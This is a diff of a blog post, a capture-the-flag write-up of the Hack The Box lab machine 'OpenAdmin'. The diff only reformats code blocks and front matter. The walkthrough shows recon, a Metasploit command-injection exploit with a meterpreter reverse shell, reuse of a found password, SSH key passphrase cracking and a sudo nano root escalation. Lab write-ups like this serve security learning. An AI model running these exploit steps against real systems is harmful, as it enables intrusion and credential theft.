@@ -1,9 +1,8 @@
 ---
-layout: post
-title:  "Hack The Box - OpenAdmin"
-date:   2020-05-03 10:27:00 +0800
-categories: hackthebox
-tags: opennetadmin gtfobin linux
+title: Hack The Box - OpenAdmin
+date: 2020-05-03 10:27:00 +0800
+categories: [hackthebox]
+tags: [opennetadmin, gtfobin, linux]
 ---
 
 ![](/assets/images/openadmin.png){:height="414px" width="615px"}
@@ -14,14 +13,14 @@ The operating systems that I will be using to tackle this machine is a Kali Linu
 
 What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.
 
-{% highlight bash %}
+```bash
 $ echo "10.10.10.171 openadmin.htb" >> /etc/hosts
-{% endhighlight %}
+```
 
 # Reconnaissance
 
 Using `nmap`, we are able to determine the open ports and running services on the machine.
-{% highlight bash %}
+```bash
 $ nmap -sV -sT -sC openadmin.htb
 tarting Nmap 7.80 ( https://nmap.org ) at 2020-01-10 11:35 EST
 Nmap scan report for openadmin.htb (10.10.10.171)
@@ -39,7 +38,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 262.61 seconds
 
-{% endhighlight %}
+```
 
 # Enumeration (1)
 
@@ -49,13 +48,13 @@ Not much can be done with the `ssh` service as we do not have any credentials on
 
 Nothing much here so lets bruteforce some directories using `gobuster`.
 
-{% highlight bash %}
+```bash
 $ gobuster dir -u http://openadmin.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100 -k -q 
 ...
 /music (Status: 301)
 /artwork (Status: 301)
 /sierra (Status: 301)
-{% endhighlight %}
+```
 
 There's a few places to check out but lets take a look at `/music` first.
 
@@ -67,13 +66,13 @@ Mostly static pages but after much "crawling" around, I found `/ona` by clicking
 
 We are presented with the UI for [`OpenNetAdmin`](https://opennetadmin.com/). 
 
-{% highlight raw %}
+```
 OpenNetAdmin provides a database managed inventory of your IP network. Each subnet, host, and IP can be tracked via a centralized AJAX enabled web interface that can help reduce tracking errors.
-{% endhighlight %}
+```
 
 From the UI, we can see that the version of `OpenNetAdmin` installed on the box is `v18.1.1`. With that knowledge, I used `searchsploit` to search for any possible exploit for this version.
 
-{% highlight bash %}
+```bash
 searchsploit OpenNetAdmin 18.1.1
 ----------------------------------------------------------------------------------- ----------------------------------------
  Exploit Title                                                                     |  Path
@@ -84,11 +83,11 @@ OpenNetAdmin 18.1.1 - Remote Code Execution                                     
 ----------------------------------------------------------------------------------- ----------------------------------------
 Shellcodes: No Result
 Papers: No Result
-{% endhighlight %}
+```
 
 I will be using the `Metasploit` module for this one.
 
-{% highlight bash %}
+```bash
 $ msfconsole
 msf5 > search opennetadmin
 
@@ -110,10 +109,10 @@ msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > run
 [*] Exploiting...
 [*] Command Stager progress - 100.00% done (703/703 bytes)
 [*] Exploit completed, but no session was created.
-{% endhighlight %}
+```
 
 Hmm no session? Lets use a 64-bit payload instead.
-{% highlight bash %}
+```bash
 msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set payload linux/x64/meterpreter/reverse_tcp
 payload => linux/x64/meterpreter/reverse_tcp
 msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > run 
@@ -126,21 +125,21 @@ msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > run
 
 meterpreter > getuid
 Server username: no-user @ openadmin (uid=33, gid=33, euid=33, egid=33)
-{% endhighlight %}
+```
 
 Alright, we got a foothold! Lets try spawning a `tty` shell.
 
-{% highlight bash %}
+```bash
 meterpreter > shell
 which python
 which python3
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 www-data@openadmin:/opt/ona/www$
-{% endhighlight %}
+```
 
 Seems like we are in the web service's directory.
 
-{% highlight bash %}
+```bash
 www-data@openadmin:/opt/ona/www$ ls -al
 -rw-rw-r--  1 www-data www-data  1970 Jan  3  2018 .htaccess.example
 drwxrwxr-x  2 www-data www-data  4096 Jan  3  2018 config
@@ -156,11 +155,11 @@ drwxrwxr-x  3 www-data www-data  4096 Jan  3  2018 modules
 drwxrwxr-x  3 www-data www-data  4096 Jan  3  2018 plugins
 drwxrwxr-x  2 www-data www-data  4096 Jan  3  2018 winc
 drwxrwxr-x  3 www-data www-data  4096 Jan  3  2018 workspace_plugins
-{% endhighlight %}
+```
 
 After some digging around, I only found database credentials in `/opt/ona/www/local/config/database_settings.inc.php`.
 
-{% highlight bash %}
+```bash
 $ /opt/ona/www/local/config/database_settings.inc.php
 <?php
 
@@ -185,33 +184,33 @@ $ona_contexts=array (
 );
 
 ?>
-{% endhighlight %}
+```
 
 Moving on, I went to check what users were on the box.
 
-{% highlight bash %}
+```bash
 www-data@openadmin:/opt/ona/www$ ls -al /home 
 drwxr-xr-x  4 root   root   4096 Nov 22 18:00 .
 drwxr-xr-x 24 root   root   4096 Nov 21 13:41 ..
 drwxr-x---  6 jimmy  jimmy  4096 May  1 00:44 jimmy
 drwxr-x---  6 joanna joanna 4096 May  1 02:43 joanna
-{% endhighlight %}
+```
 
 With these 2 usernames and the password I found, I manually tried each possible combination and managed to log into `jimmy`.
 
-{% highlight bash %}
+```bash
 $ ssh jimmy@openadmin.htb
 jimmy@openadmin.htb's password: n1nj4W4rri0R!
 ...
 jimmy@openadmin:~$ id
 uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
-{% endhighlight %}
+```
 
 Unfortunately, `jimmy` doesn't have the `user.txt`, which means that `joanna` has it.
 
 It was hard to figure where to go next so I did some basic enumeration and found a very interesting port `52846` that was only exposed on the localhost interface.
 
-{% highlight bash %}
+```bash
 jimmy@openadmin:~$ netstat -peanut 
 (Not all processes could be identified, non-owned process info
  will not be shown, you would have to be root to see it all.)
@@ -222,11 +221,11 @@ tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      
 tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      101        16729      -                   
 tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          20036      -               
 ...
-{% endhighlight %}
+```
 
 Lets see if we can scan this port and see what service is running on it. But first, we will need to perform SSH port forwarding to our machine.
 
-{% highlight bash %}
+```bash
 $ ssh -L 1337:localhost:52846 jimmy@openadmin.htb
 jimmy@openadmin.htb's password: n1nj4W4rri0R!
 
@@ -247,7 +246,7 @@ PORT     STATE SERVICE VERSION
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 16.01 seconds
 
-{% endhighlight %}
+```
 
 There's a website on that port! Lets try visiting it using our browser.
 
@@ -255,7 +254,7 @@ There's a website on that port! Lets try visiting it using our browser.
 
 I tried with the credentials I have so far and none of them worked, so I went to check the `apache2` configs to see where are the webpages being stored at.
 
-{% highlight bash %}
+```bash
 jimmy@openadmin:/etc/apache2/sites-available$ ls -al 
 total 24
 drwxr-xr-x 2 root root 4096 Nov 23 17:13 .
@@ -263,11 +262,11 @@ drwxr-xr-x 8 root root 4096 Nov 21 14:08 ..
 -rw-r--r-- 1 root root 6338 Jul 16  2019 default-ssl.conf
 -rw-r--r-- 1 root root  303 Nov 23 17:13 internal.conf
 -rw-r--r-- 1 root root 1329 Nov 22 14:24 openadmin.conf
-{% endhighlight %}
+```
 
 Checking each of the config, we find out that the web pages are at `/var/www/internal` and we also see some hints of `joanna`.
 
-{% highlight bash %}
+```bash
 jimmy@openadmin:/etc/apache2/sites-available$ cat internal.conf
 Listen 127.0.0.1:52846
 
@@ -283,11 +282,11 @@ AssignUserID joanna joanna
     CustomLog ${APACHE_LOG_DIR}/access.log combined
 
 </VirtualHost>
-{% endhighlight %}
+```
 
 In the directory were 3 files.
 
-{% highlight bash %}
+```bash
 jimmy@openadmin:/var/www/internal$ ls -al 
 total 20
 drwxrwx--- 2 jimmy internal 4096 Nov 23 17:43 .
@@ -295,11 +294,11 @@ drwxr-xr-x 4 root  root     4096 Nov 22 18:15 ..
 -rwxrwxr-x 1 jimmy internal 3229 Nov 22 23:24 index.php
 -rwxrwxr-x 1 jimmy internal  185 Nov 23 16:37 logout.php
 -rwxrwxr-x 1 jimmy internal  339 Nov 23 17:40 main.php
-{% endhighlight %}
+```
 
 In `index.php`, we find the code used for the login page and the username and password hash were hard-coded in it!
 
-{% highlight bash %}
+```bash
 jimmy@openadmin:/var/www/internal$ cat index.php
 <?php
   $msg = '';
@@ -313,7 +312,7 @@ jimmy@openadmin:/var/www/internal$ cat index.php
     }
   }
 ?>
-{% endhighlight %}
+```
 
 If we lookup the hash online, we get "Revealed".
 
@@ -327,7 +326,7 @@ We got in! And we got a SSH private key?
 
 Checking the code for `main.php`(which was the the page we were redirected to),
 
-{% highlight bash %}
+```bash
 jimmy@openadmin:/var/www/internal$ cat main.php
 <?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
 # Open Admin Trusted
@@ -335,20 +334,20 @@ jimmy@openadmin:/var/www/internal$ cat main.php
 $output = shell_exec('cat /home/joanna/.ssh/id_rsa');
 echo "<pre>$output</pre>";
 ?>
-{% endhighlight %}
+```
 
 The private key belongs to user `joanna`. Lets try `ssh`ing using it.
 
-{% highlight bash %}
+```bash
 $ chmod 700 id_rsa 
 $ ssh -i id_rsa joanna@openadmin.htb
 Enter passphrase for key 'id_rsa': 
 
-{% endhighlight %}
+```
 
 The private key is protected with a passphrase, so we use `ssh2john` along with `john` to crack the passphrase
 
-{% highlight bash %}
+```bash
 $ python /usr/share/john/ssh2john.py id_rsa > joanna.hash
 $ john --wordlist=/usr/share/wordlists/rockyou.txt joanna.hash 
 Using default input encoding: UTF-8
@@ -362,32 +361,32 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 bloodninjas      (id_rsa)
 1g 0:00:00:05 DONE (2020-05-01 05:12) 0.1858g/s 2665Kp/s 2665Kc/s 2665KC/s     1990..*7¡Vamos!
 Session completed
-{% endhighlight %}
+```
 
 # user.txt
 
 Now, we can finally get our `user.txt`.
 
-{% highlight bash %}
+```bash
 $ ssh -i id_rsa joanna@openadmin.htb
 Enter passphrase for key 'id_rsa': bloodninjas
 ...
 joanna@openadmin:~$ cat user.txt
 c9b2XXXXXXXXXXXXXXXXXXXXXXXXXXXX
-{% endhighlight %}
+```
 
 # Enumeration (2)
 
 If we list the commands we can run `sudo` with,
 
-{% highlight bash %}
+```bash
 joanna@openadmin:~$ sudo -l 
 Matching Defaults entries for joanna on openadmin:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User joanna may run the following commands on openadmin:
     (ALL) NOPASSWD: /bin/nano /opt/priv
-{% endhighlight %}
+```
 
 
 # root.txt
@@ -396,10 +395,10 @@ User joanna may run the following commands on openadmin:
 
 Creating `/opt/priv` and running `nano` using `sudo` on `/opt/priv`:
 
-{% highlight bash %}
+```bash
 joanna@openadmin:~$ touch /opt/priv
 joanna@openadmin:~$ sudo /bin/nano /opt/priv
-{% endhighlight %}
+```
 
 Doing `Ctrl+R` and `Ctrl+X`:
 
@@ -409,4 +408,4 @@ Executing the magical string and getting the flag:
 
 ![](/assets/images/openadmin8.png) 
 
-## Rooted ! Thank you for reading and look forward for more writeups and articles !
+### Rooted ! Thank you for reading and look forward for more writeups and articles !
